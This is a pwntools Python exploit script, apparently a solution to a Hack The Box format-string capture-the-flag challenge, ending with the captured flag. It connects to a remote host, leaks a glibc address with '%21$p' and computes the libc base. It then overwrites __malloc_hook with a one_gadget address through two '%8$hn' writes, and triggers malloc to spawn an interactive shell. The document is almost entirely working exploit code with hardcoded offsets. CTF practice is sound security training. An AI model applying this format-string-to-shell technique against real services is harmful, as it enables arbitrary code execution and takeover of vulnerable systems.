from pwn import *
import time
import sys

def gstub():
    if (len(sys.argv) > 1 and sys.argv[1] == 'g'):
        gdb.attach(r)
        time.sleep(1)

g = gstub


LOCAL = False
if LOCAL:
    r = process('./format_patched')
else: 
    r = remote('83.136.253.64', 33763)

""" r.sendline("%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.") """
g()

r.sendline("%21$p") # glibc leak 

leak = int(r.recvline().decode().strip('\n')[2:],16)
print("_IO_2_1_stderr_ leak: ", hex(leak))
""" offset = 0x7fa62c4a6980 - 0x7fa62c2ba000 """
""" print("offset: ",hex(offset)) """
offset = 0x7f2fce818680 - 0x7f2fce42c000
print("offset: ", hex(offset))
""" libc_base = leak - 0x3b5680 """
libc_base = leak - 0x3ec680 
print("base: ", hex(libc_base))
""" r.interactive() """
_mhook = 0x7ff32db13c30 - 0x7ff32d75f000

# works locally but not remotely; wrong libc version?
""" one_gadget = libc_base + 0x10a38c """
""" one_gadget = libc_base + 0x4f2be  """
one_gadget = libc_base + 0x4f322 
""" one_gadget = libc_base + 0x4f2c5  """
""" print("offset: ", hex(0x7fdc560bec30 - 0x7fdc55cd3000)) """
""" print("offset: ", hex(_mhook)) """
_mhook = 0x7fdc560bec30 - 0x7fdc55cd3000
mhook = libc_base + 0x3ebc30
print("gadget: ", hex(one_gadget))
print("mhook: ", hex(mhook))

""" r.interactive() """

one_lower = one_gadget & 0xffff
one_higher = (one_gadget >> 16) & 0xffff
print("lower: ", hex(one_lower))
print("higher: ", hex(one_higher))
""" r.interactive() """
padding = b'A' * 4
payload = padding + b'%' + str(one_lower - len(padding)).encode() + b'x'
payload += b'%8$hn'
assert len(payload) % 16 == 0 
payload += p64(mhook)
print(payload)
r.sendline(payload)


padding = b'A' * 4
payload = padding + b'%' + str(one_higher - len(padding)).encode() + b'x'
payload += b'%8$hn'
assert len(payload) % 16 == 0 
payload += p64(mhook+2)
r.sendline(payload)
r.sendline("%100000c") # call malloc 
r.interactive()
# Need to write to mhook one_gadget instead
 
# overwrite 
# overwrite -mallochook with onegadget


# HTB{mall0c_h00k_f0r_th3_w1n!}


